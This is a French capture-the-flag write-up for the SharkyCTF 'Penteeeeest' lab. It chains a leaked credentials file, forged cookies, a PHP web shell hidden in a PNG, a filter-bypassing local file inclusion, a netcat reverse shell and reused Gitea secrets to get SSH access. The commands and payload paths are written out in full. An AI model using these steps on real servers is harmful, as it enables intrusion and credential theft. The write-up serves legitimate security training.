<p align="center">
  <img src="../sharky_ctf_logo.png">
</p>

# Penteeeeest (1)

![team](https://img.shields.io/static/v1?label=Team&message=Hack%27togone&color=E22244&style=for-the-badge)
![CTF](https://img.shields.io/static/v1?label=CTF%20name&message=SharkyCTF&color=blue&style=for-the-badge)
![CTF category](https://img.shields.io/static/v1?label=Catégorie&message=Network&color=orange&style=for-the-badge)


## Énnoncé 

> You've found the website of a web designer, you know, the kind of guy that tells you "You can't hack me, and even if you do, what's the point?". It might be a good target to practice your pentesting skills!


## Résolution du challenge


### Reconnaissance

> Note : Les plus observateurs remarqueront des erreurs dans la concordance des dates scans nmap. ;) 
>
> Quelques soucis étant apparus sur ce challenges, j'ai dû revenir dessus à plusieurs reprises et je ne pensais pas le terminer, ni faire le WU.
> Les commandes nmap on donc été refaites après la fin du challenge ! 


Pour ce challenge, un fichier openvpn nous est fourni. 

Une fois connecté nous arrivons sur une infrastructure pour laquelle nous n'avons pas la moindre information. 

On commence donc par vérifier les paramètres réseau obtenues lors de notre connexion au VPN : 

```bash
ip -4 a

3: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 172.30.0.14/28 brd 172.30.0.15 scope global tap0
       valid_lft forever preferred_lft forever
```

Et on scanne le réseau afin de découvrir de nouvelles machines via : 

```bash
nmap -sn 172.30.0.0/28                                                                                                                                                                           
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 00:42 CEST
Nmap scan report for 172.30.0.2
Host is up (0.047s latency).
Nmap scan report for 172.30.0.3
Host is up (0.052s latency).
Nmap scan report for 172.30.0.14
Host is up (0.000065s latency).
Nmap done: 16 IP addresses (3 hosts up) scanned in 1.58 seconds
```

Nous avons donc deux machines visibles sur le réseau, nous allons chercher à voir quels ports sont ouverts :

```bash
 nmap -sV 172.30.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 00:35 CEST
Nmap scan report for 172.30.0.2
Host is up (0.066s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds

```

```bash
nmap -sV 172.30.0.3               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 00:34 CEST
Nmap scan report for 172.30.0.3
Host is up (0.047s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds

```

Le serveur web que nous cherchons est donc sur à l'adress 172.30.0.2.


Nous lançons une reconnaissance du site web avec blackwidow : 

```
sudo ./blackwidow -u http://172.30.0.2   


                _.._
              .'    '.
             /   __   \ 
          ,  |   ><   |  ,
         . \  \      /  / .
          \_'--`(  )'--'_/
            .--'/()'--.
     1N3   /  /` '' `\  \ 
             |        |
              \      /


 + -- --=[https://crowdshield.com
 + -- --=[blackwidow v1.0


==================================================================================================
http://172.30.0.2
==================================================================================================
http://172.30.0.2/index.php
http://172.30.0.2/index.html
http://172.30.0.2/blog.html
[i] External link found! https://github.com/Michael-SharkyMaster/website 
__________________________________________________________________________________________________

==================================================================================================
http://172.30.0.2/index.php
==================================================================================================
http://172.30.0.2/index.php/../index.html
http://172.30.0.2/index.php/index.php
http://172.30.0.2/index.php/upload.php
__________________________________________________________________________________________________

==================================================================================================
http://172.30.0.2/index.html
==================================================================================================
http://172.30.0.2/index.html/index.php
http://172.30.0.2/index.html/index.html
http://172.30.0.2/index.html/blog.html
[i] External link found! https://github.com/Michael-SharkyMaster/website 
__________________________________________________________________________________________________

==================================================================================================
http://172.30.0.2/blog.html
==================================================================================================
http://172.30.0.2/blog.html/index.php
http://172.30.0.2/blog.html/index.html
http://172.30.0.2/blog.html/blog.html
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=1 
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=2 
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=3 
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=4 
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=5 
[+] Dynamic URL found! http://172.30.0.2/blog.php?article=6 
[i] External link found! https://github.com/Michael-SharkyMaster/website 
__________________________________________________________________________________________________


                _.._
              .'    '.
             /   __   \ 
          ,  |   ><   |  ,
         . \  \      /  / .
          \_'--`(  )'--'_/
            .--'/()'--.
     1N3   /  /` '' `\  \ 
             |        |
              \      /


 + -- --=[https://crowdshield.com
 + -- --=[blackwidow v1.0

[+] URL's Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-urls-sorted.txt
__________________________________________________________________________________________________
http://172.30.0.2/blog.html
http://172.30.0.2/blog.html/blog.html
http://172.30.0.2/blog.html/index.html
http://172.30.0.2/blog.html/index.php
http://172.30.0.2/blog.php?article=1
http://172.30.0.2/blog.php?article=2
http://172.30.0.2/blog.php?article=3
http://172.30.0.2/blog.php?article=4
http://172.30.0.2/blog.php?article=5
http://172.30.0.2/blog.php?article=6
http://172.30.0.2/index.html
http://172.30.0.2/index.html/blog.html
http://172.30.0.2/index.html/index.html
http://172.30.0.2/index.html/index.php
http://172.30.0.2/index.php
http://172.30.0.2/index.php/../index.html
http://172.30.0.2/index.php/index.php
http://172.30.0.2/index.php/upload.php

[+] Dynamic URL's Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-dynamic-sorted.txt
__________________________________________________________________________________________________
http://172.30.0.2/blog.php?article=1
http://172.30.0.2/blog.php?article=2
http://172.30.0.2/blog.php?article=3
http://172.30.0.2/blog.php?article=4
http://172.30.0.2/blog.php?article=5
http://172.30.0.2/blog.php?article=6

[+] Form URL's Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-forms-sorted.txt
__________________________________________________________________________________________________

[+] Unique Dynamic Parameters Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-dynamic-unique.txt
__________________________________________________________________________________________________
http://172.30.0.2/blog.php?article=1

[+] Sub-domains Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-subdomains-sorted.txt
__________________________________________________________________________________________________

[+] Emails Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-emails-sorted.txt
__________________________________________________________________________________________________

[+] Phones Discovered: 
/usr/share/blackwidow/172.30.0.2_80/172.30.0.2_80-phones-sorted.txt
__________________________________________________________________________________________________

[+] Loot Saved To: 
/usr/share/blackwidow/172.30.0.2_80/
__________________________________________________________________________________________________
```


Nous pouvons voir plusieurs choses intéréssantes sur ce scan : 

* un lien externe vers un repo github : https://github.com/Michael-SharkyMaster/website
* des urls qui comportent un paramètre GET qui pourrait peut-être servir à faire une LFI


Ouvrons le site : 

![](./images/penteeeeest/vue_page_accueil.png)


Nous retrouvons sur la page d'accueil notre lien github et on apprend qu'il s'agit du code source du site `"This website is also host on Github".`

Nous apprenons que le blogueur s'appelle Michael. 
Ceci pourrait être utile pour un potentiel identifiant.

Jetons un coup d'oeil au repo github : 

![](./images/penteeeeest/github_project.png)


En analysant les sources de chaque fichiers présents dans ce repository, j'ai pu relever plusieurs élèments intérréssants : 
* admin/login.php 
* admin/png_upload.php
* blog.php


Le fichier admin/login.php contenait le code suivant qui nous permettait de confirmer que 'Michael' est un identifiant de connexion :

```php
<?php

  if ((isset($_POST['login']) && isset($_POST['password'])) || isset($_POST['secret_question']))
  {
    $result = 'This feature is currently disabled.';
    if (isset($_POST['login']) && isset($_POST['password']))
    {
      if ($_POST['login'] === 'Michael' && $_POST['password'] === str_replace(array("\n", "\r", " "), '', file_get_contents('creds.txt'))) {
        // $_COOKIE['username'] = $_POST['login'];
        // $_COOKIE['password'] = $_POST['password'];
        //
        // $result = "Successfully Login!\n";
      }
      else {
        $result = "Wrong Username/Password\n";
      }
    }
    else {
      if ($_POST['secret_question'] !== 'Badger')
      {
        $result = "Wrong anwser\n";
      }
      else {
        // Todo: Reset password and configure sending email
      }
    }
  }
?>
```

Egalement nous découvrons un fichier qui n'est pas présent dans le répositorty : creds.txt

Nous allons récupérer celui-ci : 

```bash
curl http://172.30.0.2/admin/creds.txt
Badger1992
```

Nous avons maintenant le mot de passe de l'utilisateur.

Passons à l'upload : 

```php
<?php
if (isset($_COOKIE['username']) && isset($_COOKIE['password']) && $_COOKIE['username'] == 'Michael' && $_COOKIE['password'] === str_replace(array("\n", "\r", " "), '', file_get_contents('creds.txt'))) {
  $size = array(
    "width" => 32,
    "height" => 32
  );

  $dir = "../blog/uploads/";

  if (isset($_FILES['upload']) && $_FILES['upload']['error'] === 0) {
      $check = getimagesize($_FILES["upload"]["tmp_name"]);

      $file_extension = pathinfo($_FILES["upload"]["name"], PATHINFO_EXTENSION);

      if (!file_exists($_FILES["upload"]["tmp_name"])) {
          $response = array(
              "type" => "error",
              "message" => "Choose image file to upload."
          );
      }
      else if ($file_extension !== "png") {
          $response = array(
              "type" => "error",
              "message" => "Upload valid images. Only PNG and JPEG are allowed."
          );
      }
      else if (($_FILES["upload"]["size"] > 2000000)) {
          $response = array(
              "type" => "error",
              "message" => "Image size exceeds 2MB"
          );
      }
      else if ($check['mime'] !== "image/png")
      {
        $response = array(
            "type" => "error",
            "message" => "Invalid mimetype"
        );
      }
      else {
          $target = imagecreatetruecolor($size['width'], $size['height']);

          imagecopyresampled($target, imagecreatefromstring(file_get_contents($_FILES["upload"]["tmp_name"])), 0, 0, 0, 0, $size['width'], $size['height'], $check[0], $check[1]);

          if (imagepng($target, $dir.basename($_FILES["upload"]["name"]))) {
              $response = array(
                  "type" => "success",
                  "message" => "Image uploaded successfully."
              );
          } else {
              $response = array(
                  "type" => "error",
                  "message" => "Problem in uploading image files."
              );
          }
      }
  }
  else {
    $response = array(
        "type" => "error",
        "message" => "No file provided."
    );
  }

  echo $response['type'].": ".$response['message'];
}
else {
  echo 'Invalid Credentials.';
}
?>

```

Nous avons ici à faire à un formulaire d'upload qui semble à première vue sécurisé. 
Le contrôle de l'extension et du type MIME est réalisé, nous pourrions penser que celui-ci n'est pas intéréssant. 

Cependant, je décide de vérifier s'il existe une faille sur une des fonctions utilisées. 

Et là, c'est le jackpot, je tombe sur cette faille très intéréssante que je ne connaissais pas : https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

> Si vous encodez soigneusement un shell web dans une image, vous pouvez contourner les filtres côté serveur et faire en sorte que les shells se matérialisent de nulle part (et je ne parle pas d'encoder des données dans des commentaires ou des métadonnées) - ce post vous montrera comment il est possible d'écrire des shells PHP dans des morceaux PNG IDAT en utilisant uniquement GD.


L'article parlant d'utiliser une LFI, je me suis rappellé du paramètre GET "article" précédemment trouvé grâce à blackwidow.

Ce paramètre est traité par la page php blog.php :

```php

<?php
	if (isset($_GET['article']))
	{
		$file = str_replace('../', '', $_GET['article']);

		if (is_numeric($file))
			$file = 'blog_'.$file.'.html';

		if (strpos($file, 'blog_') !== false && strpos($file, 'html') !== false) {
			include(dirname(__FILE__).'/blog/'.$file);
		}
		else {
			echo 'Invalid Format';
		}
	}
	else
	{
		include(dirname(__FILE__).'/blog.html');
	}
?>
```

Nous avons bien une inclusion de fichier. 

Nous avons toutes les cartes en main pour notre exploitation.


### Exploitation


La première étape de l'exploitation consiste à créer les cookies nécéssaires pour accéder à la page admin/upload.php : 

```php 
		<?php
		if (isset($_COOKIE['username']) && isset($_COOKIE['password']) && $_COOKIE['username'] == 'Michael' && $_COOKIE['password'] === str_replace(array("\n", "\r", " "), '', file_get_contents('creds.txt')))
		{
			?>
			<form action="png_upload.php" method="post" enctype="multipart/form-data">
				<div class="custom-file">
					<input name="upload" type="file" class="custom-file-input" id="customFile">
					<label class="custom-file-label" for="customFile">Choose file (Only PNG)</label>
					<input type="submit" value="Upload Image" name="submit">
				</div>
			</form>
			<?php
			}
			else {
				echo 'You must be login to use this feature.';
			}
		?>
```

Nous allons pour cela utiliser l'extension Firefox [cookie editor](https://addons.mozilla.org/fr/firefox/addon/cookie-editor/) et les crédentials trouvés lors de notre phase de reconnaissance :

![cookie](images/penteeeeest/cookie.png)

On ajoute donc le cookie "username" avec la valeur "Michael" et le cookie "password" avec la valeur contenue dans creds.txt : "Badger1992"

Nous avons maintenant accès au formulaire d'upload : 

![payload](images/penteeeeest/upload.png)

Concernant le png à déposer, il suffisait de récupérer le payload mis à dispostion sur l'article : https://www.idontplaydarts.com/images/phppng.png

Celui-ci est également disponible dans ce repository : [payload](files/penteeeeest/blog_payload.html.png)

Nous envoyons le formulaire et nous obtenons le message `"success: Image uploaded successfully."`

Nous savons grâce au code source, et au scan, que les images sont envoyés dans : 

```php
$dir = "../blog/uploads/";
```

Nous vérifions que celui-ci est bien à l'adresse prévue : http://172.30.0.2/blog/uploads/payload.png.

C'était bien le cas.

Il ne nous reste donc plus qu'à effectuer notre `LFI` :  http://172.30.0.2/blog/uploads/payload.png

Et là, c'est le drame, nous avons le message d'erreur : "Invalid Format"

Pourquoi ? 

Tout simplement qu'il y'avait un peu de `filtrage` ! 

Le premier consistant à supprimer l'appel relatif : 

```php
$file = str_replace('../', '', $_GET['article']);
```

Le second qui consistait à vérifier la présence de "_blog" dans le nom du fichier inclut et le dernier qui s'assurait de la présence de l'extension ".html" :

```php
if (strpos($file, 'blog_') !== false && strpos($file, 'html') !== false) {
			include(dirname(__FILE__).'/blog/'.$file);
		}
```

Pour le premier, nous allons modifier le début du chemin "./" par "..//" qui sera transformé par la fonction str_replace en "./" ce qui nous permettra d'effectuer l'inclusion comme voulu.

Pour le second, et le troisième, nous allons modifier le nom de fichier comme ceci : blog_payload.html.png

Notre LFI devrait donc être : `..//uploads/blog_payload.html.png`

Nous transférons notre fichier et tentons l'inclusion : http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png 

Ça passe ! 

Nous pouvons donc exploiter le shell contenu dans notre PNG : 

```bash
wget "http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png&0=shell_exec"  --post-data "1=ls"  
```

```
�PNG

   
IHDR           ��   	pHYs  �  ��+   `IDATH�c\52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180
admin
blog
blog.html
blog.php
css
errors
icon-fonts
img
index.html
js
X����s^7�����~_�}�'���ɿ_�|�00cٹg��=�2��Q0
F�(�`��Q0
�
  ��x
    IEND�B`�<center><a href="https://github.com/Michael-SharkyMaster/website">This website is also host on Github</a></center>
```

Notre commande passe. 

Nous allons chercher à savoir si `[netcat](https://fr.wikipedia.org/wiki/Netcat)` est installé afin d'obtenir un reverse shell : 


```bash
wget "http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png&0=shell_exec"  --post-data "1=which nc"
```

```
�PNG

   
IHDR           ��   	pHYs  �  ��+   `IDATH�c\/bin/nc
X����s^7�����~_�}�'���ɿ_�|�00cٹg��=�2��Q0
F�(�`��Q0
�
  ��x
    IEND�B`�<center><a href="https://github.com/Michael-SharkyMaster/website">This website is also host on Github</a></center>
```

Il l'est, nous pouvons donc lancer localement netcat en écoute : 

```bash
nc -lvp 1337
```

Puis demander au serveur cible d'utiliser netcat pour se connecter sur le port que nous venons de mettre en écoute : 

```bash
wget "http://172.30.0.2/blog.php?article=..//uploads/blog_payload.html.png&0=shell_exec"  --post-data "1=nc 172.30.0.14 1337 -e /bin/sh"
``` 
 
 
On récupère bien notre reverse shell : 

```bash
nc -lvp 1337                                         
listening on [any] 1337 ...
172.30.0.2: inverse host lookup failed: Unknown host
connect to [172.30.0.14] from (UNKNOWN) [172.30.0.2] 60184

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
 
Nous sommes connecté avec l'utilisateur www-data et nous allons donc devoir chercher un utilisateur sur lequel pivoter :
 
```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
mysql:x:105:106:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
git:x:107:109:Git Version Control,,,:/home/git:/bin/bash

```

On peut voir que le seul utilisateur qui possède un bash, hormis root, est l'user git.
On cherche à savoir si des processus sont executés par celui-ci : 

```bash
ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   4504  1680 ?        Ss   20:32   0:00 /bin/sh /usr/local/bin/start.sh
root         9  0.0  0.0  26068  2572 ?        S    20:32   0:00 cron -f
root        40  0.0  0.0 288504 26208 ?        Ss   20:32   0:00 /usr/sbin/apache2 -k start
root        41  0.0  0.0  65512  6256 ?        S    20:32   0:00 /usr/sbin/sshd -D
www-data    42  0.0  0.0 289004 13644 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    43  0.0  0.0 288988 12916 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    44  0.0  0.0 288944 13376 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    45  0.0  0.0 289016 14016 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    49  0.0  0.0 289004 12992 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    51  0.0  0.0 289012 13304 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data    54  0.0  0.0 289004 12992 ?        S    20:32   0:00 /usr/sbin/apache2 -k start
www-data   167  0.0  0.0 288988 12848 ?        S    20:55   0:00 /usr/sbin/apache2 -k start
www-data   454  0.0  0.0 288808 12596 ?        S    21:58   0:00 /usr/sbin/apache2 -k start
www-data   715  0.0  0.0 288808 12520 ?        S    22:44   0:00 /usr/sbin/apache2 -k start
www-data  1080  0.0  0.0   4504   792 ?        S    23:40   0:00 sh -c nc 172.30.0.14 1337 -e /bin/sh
www-data  1081  0.0  0.0   4504  1576 ?        S    23:40   0:00 sh
www-data  1130  0.0  0.0  34424  2792 ?        R    23:42   0:00 ps -aux

```

Nope...

On cherche les fichiers détennus par l'utilisateur git : 

```bash
find /var -user git  
/var/lib/gitea
/var/www/html/52e8b95db9d298bd03741e99abe57c8c1ff1fbd80bd94c366a7574baac7b1180

cd /var/lib/gitea
ls -la
total 16
drwxrwxr-x 1 root git  4096 May  9 17:30 .
drwxr-xr-x 1 root root 4096 May  9 20:32 ..
-rw-r--r-- 1 git  git  1592 Apr 17 00:59 app.ini
```

On ouvre le fichier trouvé : 

 ```bash
cat app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_USER = git
RUN_PASSWD = B33r_Bamboo_Michael
RUN_MODE = prod

[oauth2]
JWT_SECRET = oUqiXymhOjxmvtHWNYVilt4QNWMvLGVwDd3V_CnYqsk

[security]
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE1ODY4Nzk4NzZ9.UAB_BOzaC0N3jz_t1prqY_Ipo1neSs7pxqnxnO8f1XA
INSTALL_LOCK   = true
SECRET_KEY     = LJlnrqXYDJEstw7sZbu9R9EQzHisotxe3br8TYwnIsr8qzkWHp1tfOgy8p7lRvR0

[database]
DB_TYPE  = mysql
HOST     = 127.0.0.1:3306
NAME     = gitea
USER     = gitea
PASSWD   = B33r_Bamboo_Michael
SSL_MODE = disable
CHARSET  = utf8
PATH     = /var/lib/gitea/data/gitea.db

[..K]
```

On trouve un mot de passe, on espère qu'il s'agira du même pour l'utilisateur git. 

On vérifie cela en se connectant via SSH : 

```bash
ssh git@172.30.0.2
The authenticity of host '172.30.0.2 (172.30.0.2)' can't be established.
ECDSA key fingerprint is SHA256:2zn/+LnCgLGBVKvQRjqj79aI9/NNU+zafoSrP+Gxi/Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.30.0.2' (ECDSA) to the list of known hosts.
git@172.30.0.2's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.19.0-6-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

git@1ec8ae0b195f:~$ id
uid=107(git) gid=109(git) groups=109(git)

``` 

Il ne nous reste plus qu'à trouver le flag :
 
```bash 
git@e2b32e161e0c:~$ ls
gitea-repositories  note.txt  user.txt
git@e2b32e161e0c:~$ cat note.txt
Gitea website backup just in case something goes wrong.
git@e2b32e161e0c:~$ cat user.txt
shkCTF{juSt_h4v3_t0_pr1v3sc_n0w_6bb4369a853e943339aab363e22869cd}
```

Bingo ! 

## Flag 

Le flag pour ce challenge était donc : `shkCTF{juSt_h4v3_t0_pr1v3sc_n0w_6bb4369a853e943339aab363e22869cd}`

Flag et WU rédigé par [@RavenXploit](https://twitter.com/ravenxploit)

![Hack'togone emblem](../hack_togone.svg)